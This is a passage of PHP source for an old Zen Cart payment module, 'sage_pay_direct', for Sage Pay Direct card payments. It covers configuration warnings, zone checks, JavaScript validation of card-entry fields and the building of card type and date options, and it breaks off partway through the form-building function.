<?php

/**
 * sage_pay_direct
 *
 * @author     Conor Kerr <sage_pay_direct@dev.ceon.net>
 * @author     Jason LeBaron <jason@networkdad.com>
 * @copyright  Copyright 2006-2009 Ceon
 * @copyright  Portions Copyright 2004-2006 Jason LeBaron
 * @copyright  Portions Copyright 2003-2006 Zen Cart Development Team
 * @copyright  Portions Copyright 2003 osCommerce
 * @link       http://dev.ceon.net/web/zen-cart/sage_pay_direct
 * @license    http://www.gnu.org/copyleft/gpl.html   GNU Public License V2.0
 * @version    $Id: sage_pay_direct.php 385 2009-06-23 11:11:45Z Bob $
 */

/**
 * Version definition, don't touch!
 */
define('MODULE_PAYMENT_SAGE_PAY_DIRECT_VERSION_NO', '1.0.1');


// {{{ constants

/**
 * The default values for the customer's address to be used in test mode to successfully complete
 * AVS checks (to return a status of "MATCHED")
 */
define('SAGE_PAY_DIRECT_DEFAULT_BILLING_ADDRESS', '88');
define('SAGE_PAY_DIRECT_DEFAULT_POSTCODE', '412');

// }}}


// {{{ sage_pay_direct

/**
 * Payment Module conforming to Zen Cart format. Retains all Card Details entered throughout
 * the checkout process, making use of PEAR Crypt Blowfish, if possible, to encrypt the details and
 * therefore hopefully comply with any applicable Data Protection Laws.
 *
 * @author     Conor Kerr <sage_pay_direct@dev.ceon.net>
 * @author     Jason LeBaron <jason@networkdad.com>
 * @copyright  Copyright 2006-2009 Ceon
 * @copyright  Portions Copyright 2004-2006 Jason LeBaron
 * @copyright  Portions Copyright 2003-2006 Zen Cart Development Team
 * @copyright  Portions Copyright 2003 osCommerce
 * @link       http://dev.ceon.net/web/zen-cart/sage_pay_direct
 * @license    http://www.gnu.org/copyleft/gpl.html   GNU Public License V2.0
 */
class sage_pay_direct
{
	// {{{ properties
	
	/**
	 * The internal 'code' name used to designate "this" payment module.
	 *
	 * @var     string
	 * @access  public
	 */
	var $code;
	
	/**
	 * The version of this module.
	 *
	 * @var     string
	 * @access  public
	 */
	var $version;
	
	/**
	 * The name displayed for this payment method.
	 *
	 * @var     string
	 * @access  public
	 */
	var $title;
	
	/**
	 * The description displayed for this payment method.
	 *
	 * @var     string
	 * @access  public
	 */
	var $description;
	
	/**
	 * Module status - set based on various config and zone criteria.
	 *
	 * @var     boolean
	 * @access  public
	 */
	var $enabled;
	
	/**
	 * The zone to which this module is restricted for use.
	 *
	 * @var     integer
	 * @access  public
	 */
	var $zone;
	
	/**
	 * The sort order of display for this module within the checkout's payment method listing.
	 *
	 * @var     integer
	 * @access  public
	 */
	var $sort_order;
	
	/**
	 * The order status setting for orders which have been passed to Sage Pay Direct.
	 *
	 * @var     integer
	 * @access  public
	 * @default 0
	 */
	var $order_status = 0;
	
	/**
	 * The values for the data returned by Sage Pay from a transaction query.
	 *
	 * @var     array
	 * @access  protected
	 */
	var $_sage_pay_return_values;
	
	// }}}
	
	
	// {{{ Class Constructor
	
	/**
	 * Create a new instance of the sage_pay_direct class
	 * 
	 * @access  public
	 * @param   none
	 */
	function sage_pay_direct()
	{
		global $order, $db;
		
		$this->code = 'sage_pay_direct';
		$this->version = MODULE_PAYMENT_SAGE_PAY_DIRECT_VERSION_NO;
		
		// Perform error checking of module's configuration ////////////////////////////////////////
		
		// Variable holds status of configuration checks so that module can be disabled if it cannot
		// perform its function
		$critical_config_problem = false;
		
		$sage_pay_direct_config_messages = '';
		
		// Output warning if database table doesn't exist
		$table_exists_query = 'SHOW TABLES LIKE "' . TABLE_SAGE_PAY_DIRECT . '";';
		$table_exists_result = $db->Execute($table_exists_query);
		
		if ($table_exists_result->EOF) {
			// Database doesn't exist
			$critical_config_problem = true;
			
			$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />The Sage Pay Direct Database Table Does Not Exist!</strong><br /><br /><strong><span style="color: red">Please create the database table, according to the installation instructions!</span></strong><br /><br /><br />';
		}
		
		if (defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION')) {
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION == 'Yes') {
				if (!defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH')) {
					// User hasn't upgraded to latest version yet!
				} else if (MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH == 'Yes') {
					// Output warning if PEAR files or Blowfish encryption class not found
					if (ceon_file_exists_in_include_path('PEAR.php') !=
							CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS) {
						$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />Your PHP installation does NOT have access to PEAR on your server!</strong><br /><br /><span style="color: red">Blowfish encryption cannot be used for any Credit/Debit Card Details being stored in the Session.</span><br /><br />';
						$sage_pay_direct_config_messages .= '<strong>Either consult the documentation (especially the FAQs) to see how to get Blowfish encryption working on your server, change &ldquo;Store entered details temporarily in session&rdquo; to &ldquo;No&rdquo;, or disable Blowfish encryption.</strong><br /><br />';
						$sage_pay_direct_config_messages .= '<strong>It is not recommended to disable Blowfish encryption if there\'s a chance someone can see the contents of the &ldquo;sessions&rdquo; folder on your server (which may be possible if you are on a shared server) - this is left up to your own descretion.</strong><br /><br /><br />';
					} else if (ceon_file_exists_in_include_path('Crypt/Blowfish.php') !=
							CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS) {
						$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />You do NOT have PEAR:Crypt_Blowfish installed on your server!</strong><br /><br /><span style="color: red">Blowfish encryption cannot be used for any Credit/Debit Card Details being stored in the Session.</span><br /><br />';
						$sage_pay_direct_config_messages .= '<strong>Either consult the documentation (especially the FAQs) to see how to get Blowfish encryption working on your server, change &ldquo;Store entered details temporarily in session&rdquo; to &ldquo;No&rdquo;, or disable Blowfish encryption.</strong><br /><br />';
						$sage_pay_direct_config_messages .= '<strong>It is not recommended to disable Blowfish encryption if there\'s a chance someone can see the contents of the &ldquo;sessions&rdquo; folder on your server (which may be possible if you are on a shared server) - this is left up to your own descretion.</strong><br /><br /><br />';
					}
				} else {
					$sage_pay_direct_config_messages .= '<strong><span style="color: red">Notice:</span><br />You have &ldquo;Store entered details temporarily in session&rdquo; enabled but have disabled Blowfish Encryption of those details.</strong><br /><br /><span style="color: red">Blowfish encryption will not be used for any Credit/Debit Card Details being stored in the Session.</span><br /><br />';
					$sage_pay_direct_config_messages .= '<strong>It is not recommended to disable Blowfish encryption if there\'s a chance someone can see the contents of the &ldquo;sessions&rdquo; folder on your server (which may be possible if you are on a shared server) - this is left up to your own descretion.</strong><br /><br /><br />';
				}
			}
		}
		
		// Output warning if surcharge/discount functionality enabled but module not installed
		if ((defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS') &&
				MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS == 'Yes')
				&& (!defined('MODULE_ORDER_TOTAL_PAYMENT_SURCHARGES_DISCOUNTS_ENABLED')
				|| MODULE_ORDER_TOTAL_PAYMENT_SURCHARGES_DISCOUNTS_ENABLED != 'Yes')) {
			$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />Payment Surcharges/Discounts module not installed!</strong><br /><br /><strong>You have enabled the Surcharge/Discount functionality but have not installed/enabled the Payment Surcharges/Discounts Order Total module!</strong><br /><br /><br />';
		}
		
		// Output warning if cURL functions not found
		if (!extension_loaded('curl')) {
			$critical_config_problem = true;
			
			$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />You do NOT have the cURL extension loaded in your PHP installation!</strong><br /><br /><span style="color: red">The module cannot be used without this extension.</span><br /><br /><br />';
		}
		
		// Extra checks can be performed only when module is installed
		if (defined(MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPTED_CURRENCIES)) {
			// Output warning message if shop's default currency has no matching merchant
			// account
			if (strpos(MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPTED_CURRENCIES, 
					DEFAULT_CURRENCY) === false) {
				$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />Your shop\'s Default Currency does not have a matching Merchant Account!<br /><br /> If the customer is browsing the shop in a currency for which you have no matching merchant account, all prices will be converted to the Default Merchant Account\'s Currency upon checkout. <br /><br />This would mean that what the customer will be charged will be likely to differ from what their order says they\'ll be charged - this is not recommended!<br /><br />You should use a Merchant Account which can accept your shop\'s Default Currency!</strong><br /><br /><br />';
			}
			
			// Output warning if the default merchant account's currency isn't in the list of
			// accepted currencies
			if (strpos(MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPTED_CURRENCIES, 
					MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY) === false) {
				$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />Your Default Merchant Account\'s Currency is not in the list of Accepted Currencies!</strong><br /><br /><br />';
			}
			
			// Output warning if the default merchant account's currency isn't used by the
			// shop... any potential conversions could not take place if it isn't!
			if (!class_exists('currencies')) {
				require_once(DIR_FS_CATALOG . DIR_WS_CLASSES . 'currencies.php');
			}
			$check_currencies = new currencies();
			
			// Make sure currencies class was found
			if (!is_a($check_currencies, 'currencies')) {
				$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />Could not load the currencies class to determine if your Default Merchant Account Currency is used by your shop!<br /><br />Check the path to the currencies class in includes/modules/payment/sage_pay_direct.php!</strong><br /><br /><br />';
			} else {
				$currency_not_used = false;
				if (method_exists($check_currencies, 'is_set')) {
					if (!$check_currencies->is_set(MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY)) {
						$currency_not_used = true;
					}
				} else {
					// Check the currency manually as Zen Cart's admin currencies class lacks
					// some functionality
					if (!isset($check_currencies->currencies[MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY]) || 
							!zen_not_null($check_currencies->currencies[MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY])) {
						$currency_not_used = true;
					}
				}
				if ($currency_not_used) {
					$critical_config_problem = true;
					
					$sage_pay_direct_config_messages .= '<strong><span style="color: red">Warning:</span><br />Your Default Merchant Account\'s Currency isn\'t used by your shop - currency conversions cannot take place!<br /><br />You must add a matching currency in the shop admin!</strong><br /><br /><br />';
				}
			}
		}
		
		// Check the database version of the module against the version of the files
		$sage_pay_direct_config_messages .= '<fieldset style="background: #F7F6F0; margin-bottom: 1.5em"><legend style="font-size: 1.2em; font-weight: bold">Module Version Information</legend>';
		if (defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_MADE_BY_CEON')) {
			$sage_pay_direct_database_version = MODULE_PAYMENT_SAGE_PAY_DIRECT_MADE_BY_CEON;
			
			if ($sage_pay_direct_database_version == '1.0.0') {
				$sage_pay_direct_database_version= $this->version;
			}
		} else {
			// Module not installed!
			$sage_pay_direct_database_version = null;
		}
		if (!is_null($sage_pay_direct_database_version) &&
				$sage_pay_direct_database_version != $this->version) {
			// Database version doesn't match expected version
			$critical_config_problem = true;
			
			$sage_pay_direct_config_messages .= '<p style="color: red"><strong>Module is out of date!</strong></p><p style="color: red">Please &ldquo;Remove&rdquo; and &ldquo;Install&rdquo; the module as per the upgrade instructions that come with this module!</p>';
		}
		
		$sage_pay_direct_config_messages .= '<p>File Version: ' . $this->version;
		$sage_pay_direct_config_messages .= '<br />Database Version: ' .
			(is_null($sage_pay_direct_database_version) ? 'Module Not Installed' :
			$sage_pay_direct_database_version) . '</p>';
		$sage_pay_direct_config_messages .=
			'<p><a href="http://dev.ceon.net/web/zen-cart/sage_pay_direct/version_checker/' .
			$this->version . '" target="_blank">Check for updates</a></p></fieldset>';
		
		// Set the title and description based on the mode the module is in: Admin or Catalog
		if ((defined('IS_ADMIN_FLAG') && IS_ADMIN_FLAG === true) || (!isset($_GET['main_page']) ||
				$_GET['main_page'] == '')) {
			// In Admin mode
			$this->title = sprintf(MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_ADMIN_TITLE, $this->version);
			$this->description = $sage_pay_direct_config_messages . 
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DESCRIPTION_BASE;
		} else {
			// In Catalog mode
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_SAGE_PAY_LOGO == 'Yes' &&
					MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_PROTX_LOGO == 'Yes') {
				$this->title = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CATALOG_TITLE_SAGE_PAY_AND_PROTX;
			} else if (MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_PROTX_LOGO == 'Yes') {
				$this->title = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CATALOG_TITLE_PROTX_ONLY;
			} else {
				$this->title = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CATALOG_TITLE_SAGE_PAY_ONLY;
			}
			$this->description = '';
		}
		
		// Disable the module if configured as such or a critical configuration error was found
		$this->enabled = ((defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_STATUS') &&
			MODULE_PAYMENT_SAGE_PAY_DIRECT_STATUS == 'Yes' &&
			$critical_config_problem == false) ? true : false);
		
		if (defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_SORT_ORDER')) {
			$this->sort_order = MODULE_PAYMENT_SAGE_PAY_DIRECT_SORT_ORDER;
		}
		
		if (defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_ORDER_STATUS_ID') &&
				(int) MODULE_PAYMENT_SAGE_PAY_DIRECT_ORDER_STATUS_ID > 0) {
			$this->order_status = MODULE_PAYMENT_SAGE_PAY_DIRECT_ORDER_STATUS_ID;
		}
		
		if (defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_ZONE')) {
			$this->zone = (int) MODULE_PAYMENT_SAGE_PAY_DIRECT_ZONE;
		}
		
		if (is_object($order)) {
			$this->update_status();
		}
	}
	
	// }}}
	
	
	// {{{ update_status()

	/**
	 * Determines whether or not this payment method should be used for the current zone.
	 *
	 * @access  public
	 * @param   none
	 * @return  none
	 */
	function update_status()
	{
		global $order, $db;
		
		if (($this->enabled == true) && ($this->zone > 0)) {
			$check_flag = false;
			$sql = "
				SELECT
					zone_id
				FROM
					" . TABLE_ZONES_TO_GEO_ZONES . "
				WHERE
					geo_zone_id = '" . $this->zone . "'
				AND
					zone_country_id = '" . $order->billing['country']['id'] . "'
				ORDER BY
					zone_id
				";
			
			$check = $db->Execute($sql);
			while (!$check->EOF) {
				if ($check->fields['zone_id'] < 1) {
					$check_flag = true;
					break;
				} elseif ($check->fields['zone_id'] == $order->billing['zone_id']) {
					$check_flag = true;
					break;
				}
				$check->MoveNext();
			}
			
			if ($check_flag == false) {
				$this->enabled = false;
			}
		}
	}
	
	// }}}
	
	
	// {{{ javascript_validation()

	/**
	 * Validates the Card Details via Javascript (Number, Owner, Type and CVV Length)
	 *
	 * @access  public
	 * @param   none
	 * @return  string   The Javascript needed to check the submitted Card details.
	 */
	function javascript_validation()
	{
		$js = '  if (payment_value == "' . $this->code . '") {' . "\n" .
			'    var num_sage_pay_errors = 0;' . "\n" .
			'    var sage_pay_direct_error_class = "SagePayDirectFormGadgetError";' . "\n" .
			'    var sage_pay_direct_card_owner_gadget = document.checkout_payment.sage_pay_direct_card_owner;' . "\n" .
			'    var sage_pay_direct_card_number_gadget = document.checkout_payment.sage_pay_direct_card_number;' . "\n" .
			'    var sage_pay_direct_card_type_gadget = document.checkout_payment.sage_pay_direct_card_type;' . "\n" .
			'    var sage_pay_direct_card_type_gadget_value = sage_pay_direct_card_type_gadget.options[sage_pay_direct_card_type_gadget.selectedIndex].value;' . "\n" .
			'    var sage_pay_direct_card_expiry_month_gadget = document.checkout_payment.sage_pay_direct_card_expiry_month;' . "\n" .
			'    var sage_pay_direct_card_expiry_month_gadget_value = sage_pay_direct_card_expiry_month_gadget.options[sage_pay_direct_card_expiry_month_gadget.selectedIndex].value;' . "\n" .
			'    var sage_pay_direct_card_expiry_year_gadget = document.checkout_payment.sage_pay_direct_card_expiry_year;' . "\n" .
			'    var sage_pay_direct_card_expiry_year_gadget_value = sage_pay_direct_card_expiry_year_gadget.options[sage_pay_direct_card_expiry_year_gadget.selectedIndex].value;' . "\n" .
			'    var sage_pay_direct_card_cvv_gadget = document.checkout_payment.sage_pay_direct_card_cvv;' . "\n";
		
		if ($this->_showStartDate()) {
			$js .= '    var sage_pay_direct_card_start_month_gadget = document.checkout_payment.sage_pay_direct_card_start_month;' . "\n" .
			'    var sage_pay_direct_card_start_month_gadget_value = sage_pay_direct_card_start_month_gadget.options[sage_pay_direct_card_start_month_gadget.selectedIndex].value;' . "\n" .
			'    var sage_pay_direct_card_start_year_gadget = document.checkout_payment.sage_pay_direct_card_start_year;' . "\n" .
			'    var sage_pay_direct_card_start_year_gadget_value = sage_pay_direct_card_start_year_gadget.options[sage_pay_direct_card_start_year_gadget.selectedIndex].value;' . "\n";
		}
		
		$js .= '    if (sage_pay_direct_card_owner_gadget.value == "" || sage_pay_direct_card_owner_gadget.value.length < ' . CC_OWNER_MIN_LENGTH . ') {' . "\n" .
			'      num_sage_pay_errors++;' . "\n" .
			'      error_message = error_message + "' . MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JS_CARD_OWNER . '";' . "\n" .
			'      error = 1;' . "\n" .
			'      // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'      if (sage_pay_direct_card_owner_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'        sage_pay_direct_card_owner_gadget.className =  sage_pay_direct_card_owner_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'      }' . "\n" .
			'    } else {' . "\n" .
			'      // Reset error status if necessary' . "\n" .
			'      sage_pay_direct_card_owner_gadget.className = sage_pay_direct_card_owner_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n" .
			'    if (sage_pay_direct_card_type_gadget_value == "xxx") {' . "\n" .
			'      num_sage_pay_errors++;' . "\n" .
			'      error_message = error_message + "' . MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JS_CARD_TYPE . '";' . "\n" .
			'      error = 1;' . "\n" .
			'      // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'      if (sage_pay_direct_card_type_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'        sage_pay_direct_card_type_gadget.className =  sage_pay_direct_card_type_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'      }' . "\n" .
			'    } else {' . "\n" .
			'      // Reset error status if necessary' . "\n" .
			'      sage_pay_direct_card_type_gadget.className = sage_pay_direct_card_type_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n" .
			'    if (sage_pay_direct_card_number_gadget.value == "" || sage_pay_direct_card_number_gadget.value.length < ' . CC_NUMBER_MIN_LENGTH . ') {' . "\n" .
			'      num_sage_pay_errors++;' . "\n" .
			'      error_message = error_message + "' . MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JS_CARD_NUMBER . '";' . "\n" .
			'      error = 1;' . "\n" .
			'      // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'      if (sage_pay_direct_card_number_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'        sage_pay_direct_card_number_gadget.className =  sage_pay_direct_card_number_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'      }' . "\n" .
			'    } else {' . "\n" .
			'      // Reset error status if necessary' . "\n" .
			'      sage_pay_direct_card_number_gadget.className = sage_pay_direct_card_number_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n" .
			'    if (sage_pay_direct_card_expiry_month_gadget_value == "" || sage_pay_direct_card_expiry_year_gadget_value == "") {' . "\n" .
			'      num_sage_pay_errors++;' . "\n" .
			'      error_message = error_message + "' . MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JS_CARD_EXPIRY . '";' . "\n" .
			'      error = 1;' . "\n" .
			'    }' . "\n" .
			'    if (sage_pay_direct_card_expiry_month_gadget_value == "") {' . "\n" .
			'      // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'      if (sage_pay_direct_card_expiry_month_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'        sage_pay_direct_card_expiry_month_gadget.className =  sage_pay_direct_card_expiry_month_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'      }' . "\n" .
			'    } else {' . "\n" .
			'      // Reset error status if necessary' . "\n" .
			'      sage_pay_direct_card_expiry_month_gadget.className = sage_pay_direct_card_expiry_month_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n" .
			'    if (sage_pay_direct_card_expiry_year_gadget_value == "") {' . "\n" .
			'      // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'      if (sage_pay_direct_card_expiry_year_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'        sage_pay_direct_card_expiry_year_gadget.className =  sage_pay_direct_card_expiry_year_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'      }' . "\n" .
			'    } else {' . "\n" .
			'      // Reset error status if necessary' . "\n" .
			'      sage_pay_direct_card_expiry_year_gadget.className = sage_pay_direct_card_expiry_year_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n";
		
		$js .= '    if (sage_pay_direct_card_cvv_gadget.value == "" || sage_pay_direct_card_cvv_gadget.value.length < 3 ||
			sage_pay_direct_card_cvv_gadget.value.length > 4) {' . "\n" .
			'      num_sage_pay_errors++;' . "\n" .
			'      error_message = error_message + "' . MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JS_CARD_CVV . '";' . "\n" .
			'      error = 1;' . "\n" .
			'      // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'      if (sage_pay_direct_card_cvv_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'        sage_pay_direct_card_cvv_gadget.className =  sage_pay_direct_card_cvv_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'      }' . "\n" .
			'    } else {' . "\n" .
			'      // Reset error status if necessary' . "\n" .
			'      sage_pay_direct_card_cvv_gadget.className = sage_pay_direct_card_cvv_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n";
		
		if ($this->_showStartDate()) {
			$js .=
			'    if ((sage_pay_direct_card_start_month_gadget_value == "" && sage_pay_direct_card_start_year_gadget_value != "")' . "\n" .
			'       || (sage_pay_direct_card_start_month_gadget_value != "" && sage_pay_direct_card_start_year_gadget_value == "")) {' . "\n" .
			'        num_sage_pay_errors++;' . "\n" .
			'        error_message = error_message + "' . MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JS_CARD_START . '";' . "\n" .
			'        error = 1;' . "\n" .
			'        if (sage_pay_direct_card_start_month_gadget_value == "") {' . "\n" .
			'          // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'          if (sage_pay_direct_card_start_month_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'            sage_pay_direct_card_start_month_gadget.className =  sage_pay_direct_card_start_month_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'          }' . "\n" .
			'        } else {' . "\n" .
			'          // Reset error status if necessary' . "\n" .
			'          sage_pay_direct_card_start_month_gadget.className = sage_pay_direct_card_start_month_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'        }' . "\n" .
			'        if (sage_pay_direct_card_start_year_gadget_value == "") {' . "\n" .
			'          // Update the form gadget\'s class to give visual feedback to customer' . "\n" .
			'          if (sage_pay_direct_card_start_year_gadget.className.indexOf(sage_pay_direct_error_class) == -1) {' . "\n" .
			'            sage_pay_direct_card_start_year_gadget.className =  sage_pay_direct_card_start_year_gadget.className + " " + sage_pay_direct_error_class;' . "\n" .
			'          }' . "\n" .
			'        } else {' . "\n" .
			'          // Reset error status if necessary' . "\n" .
			'          sage_pay_direct_card_start_year_gadget.className = sage_pay_direct_card_start_year_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'        }' . "\n" .
			'    } else {' . "\n" .
			'        // Make sure that, if customer hasn\'t used either start date field, they aren\'t marked as having an error' . "\n" .
			'        sage_pay_direct_card_start_month_gadget.className = sage_pay_direct_card_start_month_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'        sage_pay_direct_card_start_year_gadget.className = sage_pay_direct_card_start_year_gadget.className.replace(sage_pay_direct_error_class, "");' . "\n" .
			'    }' . "\n";
		}
		
		$js .= '  }' . "\n";
		
		return $js;
	}
	
	// }}}
	
	
	// {{{ selection()

	/**
	 * Builds the Card Details Submission Fields for display on the Checkout Payment Page
	 *
	 * @access  public
	 * @param   none
	 * @return  array   The data needed to build the Card Details Submission Form.
	 *
	 *                  Array Format:
	 *
	 *                  id      string  The name of this payment class
	 *
	 *                  module  string  The title for this payment method
	 *
	 *                  fields  array   A list of the titles and form gadgets to be used to build
	 *                                  the form
	 *
	 *                                  Array Format:
	 *
	 *                 title    string  The title for this form field
	 *
	 *                 field    string  The HTML source for the form gadget for this form field
	 */
	function selection()
	{
		global $order;
		
		// Build the options for the Expiry and Start Date Select Gadgets //////////////////////////
		$expiry_month[] = array('id' => '', 'text' => MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_MONTH);
		for ($i = 1; $i < 13; $i++) {
			$expiry_month[] = array(
				'id' => sprintf('%02d', $i),
				'text' => strftime(MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_MONTH_FORMAT,
					mktime(0, 0, 0, $i, 1, 2000))
				);
		}
		
		// The Expiry Year options include the next ten years and this year
		$today = getdate();
		$expiry_year[] = array('id' => '', 'text' => MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_YEAR);
		for ($i = $today['year']; $i < $today['year'] + 10; $i++) {
			$expiry_year[] = array(
				'id' => strftime('%Y', mktime(0, 0, 0, 1, 1, $i)),
				'text' => strftime(MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_YEAR_FORMAT,
					mktime(0, 0, 0, 1, 1, $i))
				);
		}
		
		$start_month[] = array('id' => '', 'text' => MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_MONTH);
		for ($i = 1; $i < 13; $i++) {
			$start_month[] = array(
				'id' => sprintf('%02d', $i),
				'text' => strftime(MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_MONTH_FORMAT,
					mktime(0, 0, 0, $i, 1, 2000))
				);
		}
		
		// The Start Year options include the past four years and this year
		$start_year[] = array('id' => '', 'text' => MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_YEAR);
		for ($i = $today['year'] - 4; $i <= $today['year']; $i++) {
			$start_year[] = array(
				'id' => strftime('%Y', mktime(0, 0, 0, 1, 1, $i)),
				'text' => strftime(MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_YEAR_FORMAT,
					mktime(0, 0, 0, 1, 1, $i))
				);
		}
		
		// Build the options for the Card Type /////////////////////////////////////////////////////
		// Automatic detection based on card number is not used as there are clashes with some
		// Maestro and Solo numbers. Don't ask why, seems stupid, but it happens!
		// This requires customers to select a Card Type but prevents invalid data being sent to
		// Sage Pay.
		$card_type[] = array('id' => 'xxx', 'text' => 'Select Card Type');
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA == 'Yes') {
			$card_type[] = array(
				'id' => 'VISA',
				'text' => $this->_getCardTypeNameForCode('VISA')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MC == 'Yes') {
			$card_type[] = array(
				'id' => 'MC',
				'text' => $this->_getCardTypeNameForCode('MC')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_DEBIT == 'Yes') {
			$card_type[] = array(
				'id' => 'DELTA', 'text' =>
				$this->_getCardTypeNameForCode('DELTA')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_SOLO == 'Yes') {
			$card_type[] = array(
				'id' => 'SOLO',
				'text' => $this->_getCardTypeNameForCode('SOLO')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MAESTRO == 'Yes') {
			$card_type[] = array(
				'id' => 'MAESTRO', 'text' =>
				$this->_getCardTypeNameForCode('MAESTRO')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_ELECTRON == 'Yes') {
			$card_type[] = array(
				'id' => 'UKE',
				'text' => $this->_getCardTypeNameForCode('UKE')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_AMEX == 'Yes') {
			$card_type[] = array(
				'id' => 'AMEX',
				'text' => $this->_getCardTypeNameForCode('AMEX')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_DC == 'Yes') {
			$card_type[] = array(
				'id' => 'DC',
				'text' => $this->_getCardTypeNameForCode('DC')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_JCB == 'Yes') {
			$card_type[] = array(
				'id' => 'JCB',
				'text' => $this->_getCardTypeNameForCode('JCB')
				);
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_LASER == 'Yes') {
			$card_type[] = array(
				'id' => 'LASER',
				'text' => $this->_getCardTypeNameForCode('LASER')
				);
		}
		
		// Initialise the default data to be used in the input form ////////////////////////////////
		$sage_pay_direct_card_owner = $order->billing['firstname'] . ' ' .
			$order->billing['lastname'];
